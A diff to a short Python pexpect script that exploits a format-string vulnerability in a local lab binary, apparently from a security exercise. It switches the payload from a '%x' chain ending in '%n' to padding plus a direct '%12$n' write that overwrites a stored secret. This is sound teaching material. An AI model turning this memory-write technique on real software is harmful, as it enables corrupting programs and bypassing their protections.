@@ -2,11 +2,11 @@ import pexpect, os, subprocess, argparse
 
 def get_args():
     parser = argparse.ArgumentParser()
-    parser.add_argument("--secret_1", help="Input a value to change what is stored in secret[1]", default="")
+    parser.add_argument("--secret_1",type=int, help="Input a value to change what is stored in secret[1]", default=0)
     args = parser.parse_args()
     return args
 
-def break_program(size_of_change = ""):
+def break_program(size_of_change = 0):
     p = pexpect.spawn("./formatstring")
     print p.readline()
     print p.readline()
@@ -19,13 +19,13 @@ def break_program(size_of_change = ""):
     p.sendline(str(decimal_value))
     print p.readline()
     print p.readline()
-    p.sendline("%x-%x-%x-%x-%x-%x-%x-%x-"+str(size_of_change)+"%n")
+    p.sendline("".join(['1']*size_of_change)+"%12$n")
     print p.readline()
     print p.readline()
     print p.readline()
     print p.readline()
 
-  
+
 
 def main():
     args = get_args()
